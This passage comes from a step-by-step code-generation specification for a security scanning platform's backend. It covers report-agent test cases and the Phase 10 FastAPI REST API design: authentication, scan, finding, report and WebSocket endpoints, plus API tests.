   Call ai_generator.generate_all(scan_id, report_data)
   Assert: returns AIContent (not None, no exception)
   Assert: executive_summary contains fallback text
   Assert: scan continues to PDF generation

5. test_ai_generator_parses_finding_analysis_json
   Mock Claude API to return valid JSON:
   {"business_impact": "test", "technical_explanation":
    "test", "remediation_steps": ["step1"]}
   Assert: FindingAnalysis created correctly
   Assert: Finding.business_impact updated in DB

6. test_ai_generator_handles_invalid_json
   Mock Claude API to return malformed JSON
   Assert: no exception raised
   Assert: finding_analyses[id] uses fallback
   Assert: other findings still processed

7. test_risk_prioritizer_scores_correctly
   CRITICAL confirmed finding with evidence
   Expected score >= 80 (tier 1)
   Assert: finding in prioritized.tier1

8. test_risk_prioritizer_quick_wins
   Finding with title "Missing Security Headers"
   AND severity HIGH
   Assert: finding in prioritized.quick_wins

9. test_attack_path_builder_xss_cookie_chain
   Insert XSS finding + session cookie no-HttpOnly finding
   Call path_builder.build(scan_id, findings, db)
   Assert: at least 1 AttackPath with XSS in title
   Assert: path.severity in [HIGH, CRITICAL]

10. test_attack_path_builder_sqli_path
    Insert SQLi finding
    Assert: AttackPath created with "SQL" in title
    Assert: steps list has >= 3 items

11. test_pdf_builder_creates_file
    Build minimal ReportDocument with mock data
    Call pdf_builder.render(report, output_path)
    Assert: os.path.exists(output_path) == True
    Assert: file size > 10000 bytes (real PDF)

12. test_pdf_builder_jinja_renders
    Build template with 3 findings
    Assert: HTML contains all 3 finding titles
    Assert: HTML contains severity badges
    Assert: HTML contains target domain name

13. test_report_notifier_slack_format
    Mock httpx POST to return 200
    Call notifier.send_completion(...)
    Capture POST body
    Assert: body contains "attachments"
    Assert: body contains risk_score
    Assert: body contains target domain

14. test_report_notifier_fails_gracefully
    Mock ALL notification channels to raise Exception
    Call notifier.send_completion(...)
    Assert: no exception propagates
    Assert: scan still marked COMPLETED

15. test_report_agent_full_flow
    Mock: AIReportGenerator, PDFBuilder, ReportNotifier
    Run full report_agent.start_report.apply(scan_id)
    Assert: Scan.status == COMPLETED
    Assert: Scan.progress == 100
    Assert: Scan.completed_at is not None
    Assert: AllCompleteEvent published to EventBus
    Assert: Report record created in DB

Run: pytest tests/test_report_agent.py -v
All 15 must pass. Phase 9 complete when all pass.
```

---
---

# PHASE 10 — REST API (BACKEND)

---

### Step 10.0 — Phase 10 Master Context

```
PHASE 10 — REST API

Phases 0-9 complete. Full pipeline working end to end.
Now building the FastAPI REST API that exposes
everything to the frontend.

This phase builds:
1. FastAPI application entry point (main.py)
2. Authentication endpoints (register, login, JWT)
3. Scan management endpoints
4. Asset endpoints
5. Finding endpoints
6. Report endpoints
7. WebSocket (live scan progress)
8. Tool management endpoints
9. Dashboard data endpoints
10. Settings endpoints
11. Middleware (CORS, rate limiting, logging)
12. API dependencies (auth guard, DB session)

Architecture rules:
  - All endpoints are async
  - All DB access via async SQLAlchemy sessions
  - JWT authentication on all endpoints except
    /auth/login and /auth/register
  - WebSocket uses Redis pub/sub for real-time data
  - All endpoints return standardized response format
  - Pagination on all list endpoints
  - Input validation via Pydantic v2 schemas
  - Rate limiting via slowapi
  - CORS configured for frontend origin
  - All errors return consistent error schema
  - API versioned at /api/v1/

Token rule:
Generate in order, wait for "next" between each:
  Step 10.1: main.py + app factory
  Step 10.2: Dependencies (auth guard, DB, pagination)
  Step 10.3: Schemas (Pydantic request/response models)
  Step 10.4: Auth endpoints
  Step 10.5: Scan endpoints
  Step 10.6: Asset endpoints
  Step 10.7: Finding endpoints
  Step 10.8: Report endpoints
  Step 10.9: WebSocket handler
  Step 10.10: Dashboard + Tool Management endpoints
  Step 10.11: Middleware + Settings
  Step 10.12: Verification
```

---

### Step 10.1 — main.py + App Factory

```
PHASE 10 — STEP 1

Generate: backend/main.py
          backend/config/app_factory.py

Both files in one response.

─────────────────────────────────────────

main.py:

Entry point for the FastAPI application.

from contextlib import asynccontextmanager
from fastapi import FastAPI
from backend.config.app_factory import create_app

app = create_app()

if __name__ == "__main__":
  import uvicorn
  uvicorn.run(
    "backend.main:app",
    host="0.0.0.0",
    port=8000,
    reload=True,
    log_level="info"
  )

─────────────────────────────────────────

app_factory.py:

create_app() → FastAPI:

  @asynccontextmanager
  async def lifespan(app: FastAPI):
    # STARTUP
    Log: "AgentSec AI API starting..."
    
    await init_db()
    (Creates tables if not exist via Alembic)
    
    registry.auto_discover()
    (Registers all plugins)
    
    await health_checker.startup_health_check()
    (Checks all tool binaries)
    
    Log: f"Plugin registry: {len(registry.list_all())} plugins loaded"
    Log: "AgentSec AI API ready"
    
    yield
    
    # SHUTDOWN
    Log: "AgentSec AI API shutting down..."
    await close_db()

  app = FastAPI(
    title="AgentSec AI API",
    description="Autonomous Attack Surface Management Platform",
    version="1.0.0",
    docs_url="/api/docs",
    redoc_url="/api/redoc",
    openapi_url="/api/openapi.json",
    lifespan=lifespan
  )

  Register middleware:
    _register_middleware(app)

  Include routers:
    app.include_router(
      auth_router,
      prefix="/api/v1/auth",
      tags=["Authentication"]
    )
    app.include_router(
      scans_router,
      prefix="/api/v1/scans",
      tags=["Scans"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      assets_router,
      prefix="/api/v1/assets",
      tags=["Assets"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      findings_router,
      prefix="/api/v1/findings",
      tags=["Findings"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      reports_router,
      prefix="/api/v1/reports",
      tags=["Reports"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      dashboard_router,
      prefix="/api/v1/dashboard",
      tags=["Dashboard"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      tools_router,
      prefix="/api/v1/tools",
      tags=["Tools"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      settings_router,
      prefix="/api/v1/settings",
      tags=["Settings"],
      dependencies=[Depends(get_current_user)]
    )
    app.include_router(
      ws_router,
      prefix="/ws",
      tags=["WebSocket"]
    )

  @app.get("/health")
  async def health():
    return {"status": "ok", "version": "1.0.0"}

  Return app

_register_middleware(app):
  
  1. CORS:
    from fastapi.middleware.cors import CORSMiddleware
    app.add_middleware(
      CORSMiddleware,
      allow_origins=settings.ALLOWED_HOSTS,
      allow_credentials=True,
      allow_methods=["*"],
      allow_headers=["*"]
    )
  
  2. Request logging middleware:
    Custom middleware that logs:
      method, path, status_code, duration_ms
    Use loguru logger
    Skip: /health, /api/docs, /api/openapi.json
  
  3. Rate limiting (slowapi):
    limiter = Limiter(key_func=get_remote_address)
    app.state.limiter = limiter
    Default limit: 100 requests/minute per IP
    Auth endpoints: 10 requests/minute per IP
  
  4. Global exception handler:
    @app.exception_handler(Exception)
    Returns standardized error response:
    {
      "success": false,
      "error": {
        "code": "INTERNAL_ERROR",
        "message": "Internal server error",
        "detail": str(exc) if DEBUG else null
      }
    }

Generate both files. Stop after.
```

---

### Step 10.2 — Dependencies

```
PHASE 10 — STEP 2

Generate: backend/api/dependencies.py

All FastAPI dependency injection functions.

─────────────────────────────────────────

Database dependency:

get_db() → AsyncGenerator[AsyncSession, None]:
  Yields async DB session
  Closes session after request completes
  (already defined in config/database.py, re-export here)

─────────────────────────────────────────

JWT Auth dependencies:

oauth2_scheme = OAuth2PasswordBearer(
  tokenUrl="/api/v1/auth/login"
)

create_access_token(data: dict,
                    expires_delta: timedelta) → str:
  Uses python-jose:
    encode with SECRET_KEY + HS256 algorithm
  Adds: exp, iat, sub claims

create_refresh_token(user_id: str) → str:
  Longer expiry (JWT_REFRESH_TOKEN_EXPIRE_DAYS)
  Includes type="refresh" in payload

verify_token(token: str) → dict:
  Decodes JWT
  Raises HTTP 401 if expired or invalid
  Returns payload dict

get_current_user(
  token: str = Depends(oauth2_scheme),
  db: AsyncSession = Depends(get_db)
) → async → User:
  Verify token
  Extract user_id from sub claim
  Load User from DB
  If not found or not active: raise HTTP 401
  Return User

get_current_superuser(
  current_user: User = Depends(get_current_user)
) → User:
  If not current_user.is_superuser: raise HTTP 403
  Return current_user

─────────────────────────────────────────

Pagination dependency:

PaginationParams:
  page: int = Query(1, ge=1)
  page_size: int = Query(20, ge=1, le=100)
  
  @property
  def offset(self) -> int:
    return (self.page - 1) * self.page_size
  
  @property
  def limit(self) -> int:
    return self.page_size

─────────────────────────────────────────

Standard response wrapper:

def success_response(data, message="Success") → dict:
  return {
    "success": True,
    "message": message,
    "data": data
  }

def paginated_response(items, total, pagination) → dict:
  return {
    "success": True,
    "data": items,
    "pagination": {
      "page": pagination.page,
      "page_size": pagination.page_size,
      "total": total,
      "total_pages": ceil(total / pagination.page_size)
    }
  }

def error_response(code, message, status_code=400):
  raise HTTPException(
    status_code=status_code,
    detail={
      "code": code,
      "message": message
    }
  )

Generate dependencies.py only. Stop after.
```

---

### Step 10.3 — Schemas

```
PHASE 10 — STEP 3

Generate: backend/api/schemas.py

ALL Pydantic v2 request and response schemas.
Group by domain.

─────────────────────────────────────────

AUTH SCHEMAS:

RegisterRequest:
  email: EmailStr
  username: str (min 3, max 50, alphanumeric + underscore)
  password: str (min 8, must contain uppercase+number)
  
  @field_validator("password"):
    Check complexity requirements
    Raise ValueError if too weak

LoginRequest:
  email: EmailStr
  password: str

TokenResponse:
  access_token: str
  refresh_token: str
  token_type: str = "bearer"
  expires_in: int (seconds)

UserResponse:
  id: UUID
  email: str
  username: str
  role: str
  is_active: bool
  created_at: datetime
  scan_quota: int
  api_key: str | None

─────────────────────────────────────────

SCAN SCHEMAS:

CreateScanRequest:
  target: str
    @field_validator: must be valid domain or IP
    Strip http:// and https:// if present
    Reject localhost, 127.x, 10.x, 192.168.x
      (prevent scanning internal networks)
    Reject private IP ranges (RFC 1918)
  
  scan_type: ScanType = ScanType.FULL
  
  config: ScanConfig | None = None

ScanConfig:
  exploit_mode: bool = False
  max_subdomains: int = 500
  rate_limit: int = 150
  timeout: int = 300
  wordlist: str | None = None
  excluded_paths: list[str] = []
  notifications: NotificationConfig | None = None

ScanResponse:
  id: UUID
  target: str
  status: str
  scan_type: str
  progress: int
  current_phase: str | None
  current_tool: str | None
  started_at: datetime | None
  completed_at: datetime | None
  total_assets: int
  total_findings: int
  risk_score: float | None
  created_at: datetime

ScanListResponse:
  List of ScanResponse with pagination

ScanProgressResponse:
  scan_id: UUID
  status: str
  progress: int
  current_phase: str | None
  current_tool: str | None
  total_assets: int
  total_findings: int
  estimated_remaining_minutes: int | None
  ai_reasoning: str | None

─────────────────────────────────────────

ASSET SCHEMAS:

SubdomainResponse:
  id: UUID
  name: str
  ip_address: str | None
  is_alive: bool
  http_status: int | None
  https_status: int | None
  page_title: str | None
  state: str
  source: str
  technologies: list[str]
  open_ports: list[int]
  finding_count: int
  takeover_vulnerable: bool

HostResponse:
  id: UUID
  ip_address: str
  hostname: str | None
  is_alive: bool
  os_detected: str | None
  waf_detected: bool
  waf_name: str | None
  open_ports: list[PortSummary]

PortResponse:
  id: UUID
  number: int
  protocol: str
  state: str
  service_name: str | None
  service_version: str | None
  is_dangerous: bool
  banner: str | None

EndpointResponse:
  id: UUID
  url: str
  method: str
  status_code: int | None
  is_api: bool
  is_admin: bool
  is_login: bool
  has_parameters: bool
  source: str

─────────────────────────────────────────

FINDING SCHEMAS:

FindingResponse:
  id: UUID
  title: str
  description: str
  severity: str
  cvss_score: float | None
  ai_severity_score: float | None
  ai_confidence: float | None
  cve_id: str | None
  cwe_id: str | None
  owasp_category: str | None
  affected_url: str | None
  affected_parameter: str | None
  evidence: str | None
  business_impact: str | None
  remediation: str | None
  ai_explanation: str | None
  is_false_positive: bool
  is_confirmed: bool
  status: str
  tool_found_by: str
  created_at: datetime

UpdateFindingRequest:
  is_false_positive: bool | None = None
  status: str | None = None
  notes: str | None = None

FindingFilterParams:
  severity: str | None = None
  owasp_category: str | None = None
  is_confirmed: bool | None = None
  is_false_positive: bool | None = None
  tool: str | None = None
  search: str | None = None

─────────────────────────────────────────

REPORT SCHEMAS:

ReportResponse:
  id: UUID
  scan_id: UUID
  pdf_url: str
  total_findings: int
  critical_count: int
  high_count: int
  medium_count: int
  low_count: int
  risk_score: float
  generated_at: datetime

─────────────────────────────────────────

DASHBOARD SCHEMAS:

DashboardStats:
  total_scans: int
  active_scans: int
  total_findings: int
  total_assets: int
  critical_findings: int
  high_findings: int
  recent_scans: list[ScanSummary]
  risk_trend: list[RiskDataPoint]

ScanSummary:
  id: UUID
  target: str
  status: str
  risk_score: float | None
  total_findings: int
  started_at: datetime | None

─────────────────────────────────────────

TOOL SCHEMAS:

ToolResponse:
  name: str
  version: str | None
  category: str
  is_enabled: bool
  is_installed: bool
  health_status: str
  success_rate: float | None
  avg_execution_time: float | None
  total_executions: int
  failed_executions: int
  fallback_plugin: str | None

Generate schemas.py only. Stop after.
```

---

### Step 10.4 — Auth Endpoints

```
PHASE 10 — STEP 4

Generate: backend/api/auth.py

router = APIRouter()

POST /register:
  Request: RegisterRequest
  Response: UserResponse + TokenResponse
  
  Logic:
    Check if email already exists → 409 Conflict
    Check if username already exists → 409 Conflict
    Hash password using passlib bcrypt
    Create User record
    Generate access + refresh tokens
    Return user + tokens
  
  Rate limit: 5 requests/minute

POST /login:
  Request: LoginRequest (email + password)
  Response: TokenResponse
  
  Logic:
    Find user by email
    Verify password with passlib
    If invalid: return 401 (do NOT say "wrong password"
      say "invalid credentials" — prevents user enumeration)
    If user.is_active == False: return 403 "Account disabled"
    Update user.last_login
    Generate access + refresh tokens
    Return tokens
  
  Rate limit: 10 requests/minute

POST /refresh:
  Request: {"refresh_token": "..."}
  Response: TokenResponse
  
  Logic:
    Verify refresh token
    Check type == "refresh" in payload
    Load user, check is_active
    Generate new access token
    Return new tokens

POST /logout:
  Requires: JWT auth
  Logic:
    Add access token to Redis blacklist:
      Key: agentsec:token_blacklist:{jti}
      TTL: token expiry time
    Return {"message": "Logged out successfully"}

GET /me:
  Requires: JWT auth
  Returns: UserResponse for current user

POST /api-key/generate:
  Requires: JWT auth
  Logic:
    Generate random 64-char hex API key
    Hash it, store hash in User.api_key
    Return the plain key ONCE (not stored)
    Warn: "Store this key safely. It won't be shown again."

DELETE /api-key:
  Requires: JWT auth
  Sets User.api_key = None

Middleware for API key auth:
  Alternative to JWT for API access
  Header: X-API-Key: {api_key}
  Verify against stored hash
  If valid: attach user to request

Generate auth.py only. Stop after.
```

---

### Step 10.5 — Scan Endpoints

```
PHASE 10 — STEP 5

Generate: backend/api/scans.py

router = APIRouter()

POST / (Create and start scan):
  Request: CreateScanRequest
  Response: ScanResponse
  
  Logic:
    Validate target domain:
      Must be valid domain or public IP
      Must not be private IP range
      Must not be localhost
      If invalid: 400 Bad Request
    
    Check user scan quota:
      Count scans started today by user
      If >= user.scan_quota: 429 "Quota exceeded"
    
    Check if scan already running for same target:
      If Scan exists with status=RUNNING and same target:
        Return 409 "Scan already running for this target"
    
    Create Scan record with status=PENDING
    
    Dispatch Celery task:
      from backend.orchestrator import orchestrator
      await orchestrator.start_scan(
        scan_id=scan.id,
        target=scan.target,
        scan_type=request.scan_type,
        config=request.config
      )
    
    Return ScanResponse

GET / (List all scans):
  Query params: PaginationParams + status filter
  Returns: paginated list of ScanResponse
  Only returns scans for current user's organization

GET /{scan_id} (Get scan details):
  Returns: ScanResponse with full details
  Check user owns this scan (or is admin)

GET /{scan_id}/progress (Live progress):
  Returns: ScanProgressResponse
  Includes: current_tool, ai_reasoning (last decision)
  Used by frontend to poll progress (backup for WebSocket)

POST /{scan_id}/pause:
  Logic:
    Check scan.status == RUNNING
    Call orchestrator.pause_scan(scan_id)
    Return updated ScanResponse

POST /{scan_id}/resume:
  Logic:
    Check scan.status == PAUSED
    Call orchestrator.resume_scan(scan_id)
    Return updated ScanResponse

DELETE /{scan_id} (Cancel scan):
  Logic:
    Check scan.status in [PENDING, RUNNING, PAUSED]
    Call orchestrator.cancel_scan(scan_id)
    Return {"message": "Scan cancelled"}

GET /{scan_id}/logs (Get AI reasoning log):
  Returns: list of AuditLog entries for scan
  Sorted by timestamp ASC
  Used by AI Dashboard panel
  
  AuditLogEntry:
    timestamp: datetime
    phase: str
    decision: str
    reason: str
    tools_selected: list[str]

GET /{scan_id}/timeline (Tool execution timeline):
  Returns: list of Task records for scan
  Each task: {tool_name, started_at, completed_at,
              status, execution_time, fallback_used}
  Used by Live Progress Dashboard

Generate scans.py only. Stop after.
```

---

### Step 10.6 — Asset Endpoints

```
PHASE 10 — STEP 6

Generate: backend/api/assets.py

router = APIRouter()

GET /scans/{scan_id}/subdomains:
  Query: PaginationParams + filters:
    is_alive: bool | None
    has_findings: bool | None
    source: str | None
  
  Response: paginated SubdomainResponse list
  
  Each SubdomainResponse also includes:
    open_ports: [p.number for p in subdomain.ports]
    technologies: [t.name for t in subdomain.technologies]
    finding_count: count of findings for this subdomain

GET /scans/{scan_id}/hosts:
  Query: PaginationParams + is_alive filter
  Response: paginated HostResponse list
  Each includes: ports list summary

GET /scans/{scan_id}/ports:
  Query: PaginationParams + is_dangerous filter
  Response: paginated PortResponse list

GET /scans/{scan_id}/endpoints:
  Query: PaginationParams + filters:
    is_api: bool | None
    is_admin: bool | None
    is_login: bool | None
    has_parameters: bool | None
    status_code: int | None
  Response: paginated EndpointResponse list

GET /scans/{scan_id}/technologies:
  Response: all Technology records for scan
  Grouped by category:
  {
    "CMS": [...],
    "FRAMEWORK": [...],
    "SERVER": [...],
    ...
  }

GET /scans/{scan_id}/attack-surface:
  Returns complete AttackSurface summary:
  {
    total_subdomains, live_hosts, dead_hosts,
    open_ports_count, dangerous_ports: [list],
    admin_panels: [list of URLs],
    api_endpoints_count,
    login_pages: [list of URLs],
    exposed_files: [list of URLs],
    public_buckets: [list],
    certificates: [...]
  }

GET /scans/{scan_id}/dns:
  Returns DNS records for all subdomains:
  [
    {
      subdomain: str,
      a_records: [...],
      cname: str | None,
      mx: [...],
      txt: [...]
    }
  ]

Generate assets.py only. Stop after.
```

---

### Step 10.7 — Finding Endpoints

```
PHASE 10 — STEP 7

Generate: backend/api/findings.py

router = APIRouter()

GET /scans/{scan_id}/findings:
  Query: PaginationParams + FindingFilterParams
  
  Build dynamic query:
    Base: Finding.scan_id == scan_id
          AND is_false_positive == False
    
    If severity filter: add severity condition
    If owasp filter: add owasp_category condition
    If is_confirmed filter: add condition
    If tool filter: add tool_found_by condition
    If search: ILIKE on title + description
  
  Order by: severity DESC, cvss_score DESC nulls last
  
  Response: paginated FindingResponse list

GET /scans/{scan_id}/findings/summary:
  Returns aggregated summary for Vulnerability Dashboard:
  {
    by_severity: {CRITICAL: N, HIGH: N, ...},
    by_owasp: {A01:2025: N, A02:2025: N, ...},
    by_tool: {nuclei: N, sqlmap: N, ...},
    top_affected_assets: [list of URLs with counts],
    confirmed_count: int,
    unconfirmed_count: int,
    false_positive_count: int
  }

GET /findings/{finding_id}:
  Returns: complete FindingResponse including:
    full evidence text
    full request/response
    ai_explanation
    business_impact
    remediation steps
    related findings (same URL or type)

PATCH /findings/{finding_id}:
  Request: UpdateFindingRequest
  Logic:
    Only owner or admin can update
    If is_false_positive set to True:
      Update finding.is_false_positive = True
      Update finding.status = FALSE_POSITIVE
      Subtract from scan.total_findings
      Subtract from risk_score recalculation
    If status updated: update status field
    Return updated FindingResponse

GET /scans/{scan_id}/findings/export:
  Query param: format = "json" | "csv"
  
  JSON: returns all findings as JSON array
  CSV: returns CSV with columns:
    title, severity, cvss_score, cve_id, owasp,
    affected_url, tool, is_confirmed
  
  Response with appropriate Content-Type header
  Filename: agentsec_{target}_{date}_findings.{ext}

GET /scans/{scan_id}/attack-paths:
  Returns: all AttackPath records for scan
  Each with: title, steps, severity, findings_involved

GET /scans/{scan_id}/findings/secrets:
  Returns: all secret-type findings separately
  Includes: secret_type, is_verified, source_url
  Sensitive fields: secret values are ALWAYS truncated
    Never return full secret values via API

Generate findings.py only. Stop after.
```

---

### Step 10.8 — Report Endpoints

```
PHASE 10 — STEP 8

Generate: backend/api/reports.py

router = APIRouter()

GET /scans/{scan_id}/report:
  Returns: ReportResponse (metadata only, not PDF content)

GET /scans/{scan_id}/report/download:
  Returns: PDF file for download
  
  Logic:
    Find Report record for scan_id
    If not found: 404 "Report not generated yet"
    Check pdf_path exists on disk
    If not: 404 "Report file not found"
    
    Return FileResponse:
      path = report.pdf_path
      media_type = "application/pdf"
      filename = f"agentsec_report_{target}_{date}.pdf"
      
    Set headers:
      Content-Disposition: attachment; filename=...
      Cache-Control: no-cache, no-store

GET /scans/{scan_id}/report/json:
  Returns full report data as JSON:
  All sections that make up the PDF
  But as structured JSON for frontend consumption
  
  Uses same ReportDocument structure
  Useful for displaying report sections in dashboard
  without rendering PDF

POST /scans/{scan_id}/report/regenerate:
  Requires: admin role
  Logic:
    Check scan.status == COMPLETED
    Dispatch report.start task again
    Return {"message": "Report regeneration started"}

GET /reports:
  Returns: paginated list of all reports for user's org
  Sorted by generated_at DESC
  
  Each entry:
    ReportResponse + scan target + scan date

GET /reports/{report_id}/compare/{report_id2}:
  Returns comparison of two reports:
  {
    new_findings: [...] (in report 2 but not 1),
    fixed_findings: [...] (in report 1 but not 2),
    worsened: [...] (same vuln, higher severity in 2),
    improved: [...] (same vuln, lower severity in 2),
    risk_delta: float (change in risk score)
  }

Generate reports.py only. Stop after.
```

---

### Step 10.9 — WebSocket Handler

```
PHASE 10 — STEP 9

Generate: backend/api/websocket.py

WebSocket enables real-time scan progress
in the frontend Live Progress Dashboard.

router = APIRouter()

WS /scans/{scan_id}/live:

@router.websocket("/scans/{scan_id}/live")
async def scan_live_ws(
  websocket: WebSocket,
  scan_id: str,
  token: str = Query(...)
):

  STEP 1: Auth via query param token
    (WebSocket can't send Authorization headers easily)
    Try:
      payload = verify_token(token)
      user_id = payload.get("sub")
    Except:
      await websocket.close(code=4001, reason="Unauthorized")
      Return

  STEP 2: Accept connection
    await websocket.accept()
    Log: "WebSocket connected for scan {scan_id}"
    
    Add to connection manager:
      manager.add(scan_id, websocket)

  STEP 3: Send current scan state immediately
    Load Scan from DB
    current_state = {
      "type": "scan_state",
      "scan_id": scan_id,
      "status": scan.status,
      "progress": scan.progress,
      "current_phase": scan.current_phase,
      "current_tool": scan.current_tool,
      "total_assets": scan.total_assets,
      "total_findings": scan.total_findings,
      "risk_score": scan.risk_score
    }
    await websocket.send_json(current_state)

  STEP 4: Subscribe to Redis channel for this scan
    async def redis_listener():
      pubsub = redis_client.pubsub()
      await pubsub.subscribe(
        f"agentsec:events:{scan_id}",
        f"agentsec:ws:{scan_id}"
      )
      
      async for message in pubsub.listen():
        if message["type"] == "message":
          data = json.loads(message["data"])
          await websocket.send_json(data)

  STEP 5: Run listener + heartbeat concurrently
    
    async def heartbeat():
      while True:
        await asyncio.sleep(30)
        await websocket.send_json({"type": "ping"})
    
    try:
      await asyncio.gather(
        redis_listener(),
        heartbeat(),
        handle_client_messages(websocket, scan_id)
      )
    
    except WebSocketDisconnect:
      manager.remove(scan_id, websocket)
      Log: "WebSocket disconnected for scan {scan_id}"

async def handle_client_messages(ws, scan_id):
  Handle messages FROM frontend:
  
  async for data in ws.iter_json():
    if data.get("action") == "pause":
      await orchestrator.pause_scan(scan_id)
    
    if data.get("action") == "resume":
      await orchestrator.resume_scan(scan_id)
    
    if data.get("action") == "cancel":
      await orchestrator.cancel_scan(scan_id)
    
    if data.get("action") == "pong":
      pass (heartbeat response, ignore)

WebSocket message types frontend receives:
  {type: "scan_state"} → current scan snapshot
  {type: "tool_started", tool: str} → tool beginning
  {type: "tool_complete", tool: str, found: int} → tool done
  {type: "finding_found", severity: str, title: str} → new finding
  {type: "progress", progress: int, phase: str} → progress update
  {type: "asset_found", asset_type: str, value: str} → new asset
  {type: "ai_decision", decision: str, reason: str} → AI reasoning
  {type: "scan_complete", report_url: str} → scan done
  {type: "scan_failed", error: str} → scan error
  {type: "ping"} → heartbeat

ConnectionManager class:
  _connections: dict[str, list[WebSocket]] = {}
  
  add(scan_id, websocket): appends to list
  remove(scan_id, websocket): removes from list
  
  broadcast(scan_id, message: dict) → async:
    For each ws in _connections[scan_id]:
      try: await ws.send_json(message)
      except: remove from list (disconnected)
  
  broadcast_all(message: dict) → async:
    For all scan_ids and connections:
      Try to send
      Used for admin broadcast messages

manager = ConnectionManager() (singleton)

Generate websocket.py only. Stop after.
```

---

### Step 10.10 — Dashboard + Tool Management

```
PHASE 10 — STEP 10

Generate these 2 files:
backend/api/dashboard.py
backend/api/tools.py

─────────────────────────────────────────

dashboard.py:

GET /stats (Main user dashboard stats):
  Returns DashboardStats:
  {
    total_scans: count of user's scans
    active_scans: count with status=RUNNING
    total_findings: sum across all scans
    total_assets: sum across all scans
    critical_findings: sum of CRITICAL severity
    high_findings: sum of HIGH severity
    recent_scans: last 5 scans with summary
    risk_trend: last 30 days risk scores
      [{date: "2025-01-01", avg_risk: 45.2}]
  }

GET /vulnerability-trends:
  Returns finding counts grouped by date:
  {
    dates: ["2025-01-01", "2025-01-02", ...],
    critical: [2, 0, 5, ...],
    high: [10, 8, 12, ...],
    medium: [25, 30, 20, ...],
    low: [40, 35, 45, ...]
  }
  Query param: days = 30 (default)

GET /top-vulnerabilities:
  Returns: most common vulnerability types across all scans
  {
    title: "Missing Security Headers",
    count: 45,
    avg_severity: "MEDIUM",
    owasp: "A02:2025"
  }

GET /attack-surface-overview:
  Returns summary across ALL user's scans:
  {
    total_domains: int,
    total_subdomains: int,
    total_live_hosts: int,
    total_open_ports: int,
    most_common_techs: list,
    most_exposed_services: list,
    public_cloud_resources: int
  }

GET /ai-activity:
  Returns AI decision log across recent scans:
  {
    decisions_made: int,
    tools_selected_by_ai: list,
    fallbacks_triggered: int,
    false_positives_caught: int,
    attack_chains_found: int,
    avg_confidence_score: float
  }

─────────────────────────────────────────

tools.py:

GET / (List all tools):
  Returns: list of ToolResponse
  All registered plugins with health status

GET /{tool_name} (Tool details):
  Returns: single ToolResponse with full stats

GET /health (Run health check on all tools):
  Triggers health_checker.check_all()
  Returns: {tool_name: is_healthy} dict
  Note: this can take 30-60 seconds
  Consider running async and returning job_id

GET /categories (Tools grouped by category):
  Returns: {
    RECON: [tool list],
    ENUM: [tool list],
    VULN: [tool list],
    SECRET: [tool list],
    CLOUD: [tool list]
  }

PATCH /{tool_name} (Enable/disable tool):
  Requires: admin role
  Request: {is_enabled: bool}
  Updates Plugin.is_enabled in DB
  Returns: updated ToolResponse

GET /fallback-map:
  Returns: mapping of primary → fallback for all tools
  Used by Intelligent Fallback Dashboard:
  {
    "subfinder": "amass",
    "naabu": "rustscan",
    "dalfox": "nuclei",
    ...
  }

GET /performance (Tool performance analytics):
  Returns per-tool analytics:
  {
    tool_name: {
      success_rate: float,
      avg_execution_time: float,
      total_executions: int,
      failed_executions: int,
      fallback_triggered_count: int
    }
  }

Generate both files. Stop after.
```

---

### Step 10.11 — Middleware + Settings

```
PHASE 10 — STEP 11

Generate these 2 files:
backend/api/middleware.py
backend/api/settings_router.py

─────────────────────────────────────────

middleware.py:

RequestLoggingMiddleware:
  (Starlette BaseHTTPMiddleware subclass)
  
  async def dispatch(request, call_next):
    start_time = time.time()
    
    Skip logging for:
      request.url.path == "/health"
      "/api/docs" in path
      "/api/openapi" in path
    
    response = await call_next(request)
    
    duration_ms = (time.time() - start_time) * 1000
    
    Log using loguru:
      {method} {path} {status_code} {duration_ms:.0f}ms
    
    Add response header:
      X-Process-Time: {duration_ms:.2f}ms
    
    Return response

JWTBlacklistMiddleware:
  Check if incoming JWT token is in Redis blacklist
  Key: agentsec:token_blacklist:{jti}
  If found in blacklist → return 401
  (Used after logout to invalidate tokens)

APIKeyMiddleware:
  Check for X-API-Key header
  If present: verify against stored hash
  If valid: attach user to request state
  If invalid: return 401
  If absent: pass through to JWT auth

─────────────────────────────────────────

settings_router.py:

GET /notifications:
  Returns current notification settings (without secrets):
  {
    slack_enabled: bool (SLACK_WEBHOOK_URL is set),
    telegram_enabled: bool,
    discord_enabled: bool,
    email_enabled: bool
  }

PUT /notifications/test:
  Request: {channel: "slack" | "telegram" | "discord"}
  Sends a test notification to the channel
  Returns: {success: bool, message: str}

GET /scan-defaults:
  Returns default scan configuration:
  {
    max_subdomains: int,
    rate_limit: int,
    timeout: int,
    exploit_mode: bool (always false by default)
  }

PUT /scan-defaults:
  Requires: admin
  Update default scan configuration

GET /api-info:
  Returns public API information:
  {
    version: "1.0.0",
    name: "AgentSec AI API",
    docs_url: "/api/docs",
    total_plugins: int,
    healthy_plugins: int
  }

GET /quota:
  Returns current user's quota status:
  {
    daily_limit: int,
    used_today: int,
    remaining: int,
    resets_at: "midnight UTC"
  }

Generate both files. Stop after.
```

---

### Step 10.12 — Phase 10 Verification

```
PHASE 10 — STEP 12 — FINAL VERIFICATION

Phase 10 complete. Write tests/test_api.py

Test cases:

1. test_register_creates_user
   POST /api/v1/auth/register with valid data
   Assert: status 200
   Assert: response contains access_token
   Assert: User in DB with hashed password

2. test_register_rejects_weak_password
   POST /api/v1/auth/register password="simple"
   Assert: status 422 (Pydantic validation error)

3. test_register_duplicate_email
   Register same email twice
   Assert: second request returns 409

4. test_login_returns_tokens
   Register then login
   Assert: status 200
   Assert: access_token and refresh_token in response
   Assert: token_type == "bearer"

5. test_login_invalid_credentials
   POST /api/v1/auth/login wrong password
   Assert: status 401
   Assert: message does NOT say "wrong password"
   Assert: message says "invalid credentials"

6. test_protected_endpoint_requires_auth
   GET /api/v1/scans without token
   Assert: status 401

7. test_create_scan_validates_target
   POST /api/v1/scans with target="localhost"
   Assert: status 400

8. test_create_scan_validates_private_ip
   POST /api/v1/scans with target="192.168.1.1"
   Assert: status 400

9. test_create_scan_valid_domain
   POST /api/v1/scans with target="example.com"
   Assert: status 200
   Assert: scan.status == "PENDING"
   Assert: Celery task dispatched (mock Celery)

10. test_get_scan_requires_ownership
